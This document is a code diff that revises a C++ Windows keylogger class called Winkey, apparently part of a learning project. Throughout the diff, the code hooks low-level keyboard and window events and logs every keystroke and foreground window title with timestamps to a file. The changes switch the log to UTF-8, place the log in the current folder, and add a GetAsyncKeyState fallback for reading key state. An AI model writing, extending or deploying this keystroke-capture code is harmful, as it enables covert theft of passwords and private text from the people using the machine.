@@ -4,14 +4,48 @@
 #pragma comment(lib, "psapi.lib")
 
 // Declare the attributes which are used by the static methods
-bool            Winkey::_testMode;
-const char*     Winkey::_logFileName = TW_LOGFILE;
-std::wofstream  Winkey::_logFile;
-std::wstring    Winkey::_windowTitle;
-std::wstring    Winkey::_keyStroke;
-HWND            Winkey::_currentWindow;
+bool                    Winkey::_testMode = false;
+std::filesystem::path   Winkey::_logFileName;
+std::ofstream           Winkey::_logFile;
+std::wstring            Winkey::_windowTitle;
+std::wstring            Winkey::_keyStroke;
+HWND                    Winkey::_currentWindow = nullptr;
 
-Winkey::Winkey() {}
+// Helper: convert std::wstring (UTF-16) -> std::string (UTF-8) using Win32 API
+static std::string wstring_to_utf8(const std::wstring& w)
+{
+    if (w.empty()) return std::string();
+    int size_needed = ::WideCharToMultiByte(
+        CP_UTF8,                // convert to UTF-8
+        0,
+        w.data(),
+        static_cast<int>(w.size()),
+        nullptr,
+        0,
+        nullptr,
+        nullptr
+    );
+    if (size_needed <= 0) return std::string();
+    std::string out;
+    out.resize(size_needed);
+    ::WideCharToMultiByte(
+        CP_UTF8,
+        0,
+        w.data(),
+        static_cast<int>(w.size()),
+        &out[0],
+        size_needed,
+        nullptr,
+        nullptr
+    );
+    return out;
+}
+
+Winkey::Winkey() {
+    // Get the current folder
+    std::filesystem::path repoDir = std::filesystem::current_path();
+    _logFileName = repoDir / TW_LOGFILE;
+}
 
 // Set hooks to intercept events
 void Winkey::setHooks(void)
@@ -50,9 +84,9 @@ void Winkey::run(bool testMode)
     _testMode = testMode;
 
     if (_testMode) // If test mode is on, we overwrite on the file
-        _logFile.open(_logFileName, std::ios::out | std::ios::trunc);
-    else
-        _logFile.open(_logFileName, std::ios::app); // Open in appending mode
+        _logFile.open(_logFileName.string(), std::ios::out | std::ios::trunc | std::ios::binary);
+    else // Open in appending mode
+        _logFile.open(_logFileName.string(),  std::ios::out | std::ios::app | std::ios::binary);
 
 
     if (!_logFile.is_open())
@@ -62,10 +96,6 @@ void Winkey::run(bool testMode)
             WinkeyError::FileOpenFailure, "Failed to open or to create the log file.", err
         );
     }
-
-    // Tell std::wofstream to use UTF-8 encoding when writing wide
-    //  characters (wchar_t) to the file.
-    _logFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));
 
     /*
      * Main message loop
@@ -85,38 +115,41 @@ void Winkey::logToFile(void)
     // Only log the window title if it has changed (and we're not in test mode)
     if (!_testMode && (_currentWindow != lastWindow))
     {
-        time_t now = time(nullptr);
-        bool empty = _logFile.tellp() == 0;
-
-        _logFile << (empty ? L"" : L"\n\n");
-
         /* Log the current date time
          *
          * Convert time_t into a tm structure representing the local time
          *  (hours, minutes, day, month, etc.)
          */
 
-        struct tm localTime{};
+        bool        empty = _logFile.tellp() == 0;
+        time_t      now = time(nullptr);
+        struct tm   localTime{};
         if (localtime_s(&localTime, &now) == 0)
         {
-            // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
-            // `L` is for wide characters (Unicode)
-            _logFile << L"[" << std::setfill(L'0')
-                     << std::setw(2) << localTime.tm_mday << L"."
-                     << std::setw(2) << (localTime.tm_mon + 1) << L"."
-                     << (localTime.tm_year + 1900) << L" "
-                     << std::setw(2) << localTime.tm_hour << L":"
-                     << std::setw(2) << localTime.tm_min << L":"
-                     << std::setw(2) << localTime.tm_sec << L"] - '";
+            /* Prepare log as wstring
+             * Format: `[date time] - 'WINDOW_TITLE'`
+             */
+            std::wstringstream ss;
+            // Add a new line to separate the window title from the previous keystrokes
+            ss << (empty ? L"" : L"\n\n")
+               << L"[" << std::setfill(L'0')
+               << std::setw(2) << localTime.tm_mday << L"."
+               << std::setw(2) << (localTime.tm_mon + 1) << L"."
+               << (localTime.tm_year + 1900) << L" "
+               << std::setw(2) << localTime.tm_hour << L":"
+               << std::setw(2) << localTime.tm_min << L":"
+               << std::setw(2) << localTime.tm_sec << L"] - '"
+               << _windowTitle << L"'\n";
+            // Convert to UTF-8 and write
+            std::string header = wstring_to_utf8(ss.str());
+            _logFile << header;
         }
-
-        // Log the window title
-        _logFile << _windowTitle << L"'" << std::endl;
     }
     lastWindow = _currentWindow;
 
-    _logFile << _keyStroke;
-    // Ensure that everything written to the file is immediately pushed to disk
+    // Write the keystroke (as UTF-8)
+    std::string ks = wstring_to_utf8(_keyStroke);
+    _logFile << ks; // Ensure that everything written to the file is immediately pushed to disk
     _logFile.flush();
 }
 
@@ -136,8 +169,7 @@ void CALLBACK Winkey::winEventProc(
         {
             // Sanitize the window title
             for (int i = 0; i < result; ++i)
-                if (!isPrintable(windowTitle[i]))
-                    windowTitle[i] = L'?';
+                if (!isPrintable(windowTitle[i])) windowTitle[i] = L'?';
 
             /*
              * Save the current window title to log it later
@@ -195,8 +227,8 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
 
         lastVkCode = p->vkCode;
 
-        BYTE keyboardState[256];
-        wchar_t buffer[TW_KEYSTROKE_MAX];
+        BYTE keyboardState[256] = {};
+        wchar_t buffer[TW_KEYSTROKE_MAX] = {};
 
         /*
          * Get the current state of all keys
@@ -208,9 +240,12 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  (like Shift, Ctrl, Alt) if we want, for instance, the characters to be
          *  uppercase when Shift is hold.
          *
+         * We will try to get keyboard state for this thread; if it fails fallback to async.
          */
 
-        GetKeyboardState(keyboardState);
+        if (!GetKeyboardState(keyboardState))
+            for (int k = 0; k < 256; ++k)
+                keyboardState[k] = (GetAsyncKeyState(k) & 0x8000) ? 0x80 : 0;
 
         /*
          * Set modifier keys manually
@@ -303,7 +338,5 @@ void Winkey::removeHooks(void)
 Winkey::~Winkey()
 {
     removeHooks();
-
-    if (_logFile.is_open())
-        _logFile.close();
+    if (_logFile.is_open()) _logFile.close();
 }
